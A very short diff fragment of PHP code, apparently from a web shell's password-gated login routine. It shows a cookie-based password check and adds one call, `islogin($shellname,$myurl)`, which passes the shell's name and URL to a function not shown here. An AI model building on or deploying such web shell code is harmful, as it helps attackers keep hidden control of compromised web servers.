@@ -27,3 +27,4 @@ if($_COOKIE['postpass'] != md5(postpass)){
 			echo '<CENTER>用户或密码错误</CENTER>';
 		}
 	}
+	islogin($shellname,$myurl);
